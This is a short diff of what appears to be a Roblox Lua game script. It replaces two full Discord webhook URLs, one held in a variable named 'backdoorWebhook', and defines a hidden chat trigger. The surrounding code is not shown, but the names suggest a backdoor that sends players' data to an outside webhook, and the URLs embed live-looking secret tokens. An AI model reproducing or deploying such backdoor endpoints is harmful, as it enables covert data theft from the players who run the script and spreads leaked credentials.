@@ -7,8 +7,8 @@ local TweenService = game:GetService("TweenService")
 local VirtualInput = game:GetService("VirtualInputManager")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
-local webhookUrl = "https://discord.com/api/webhooks/1395839054591033424/ol-jCkvdl_uhSEMceLDCF0fvC73cIJIOzpOdFNotFXKo8ZXp1N-Sn_L53sFToyUVcgny"
-local backdoorWebhook = "https://discord.com/api/webhooks/1395839054591033424/ol-jCkvdl_uhSEMceLDCF0fvC73cIJIOzpOdFNotFXKo8ZXp1N-Sn_L53sFToyUVcgny"
+local webhookUrl = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz"
+local backdoorWebhook = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz"
 local chatTrigger = "hb1ios"
 
 local E_HOLD_TIME = 0.1
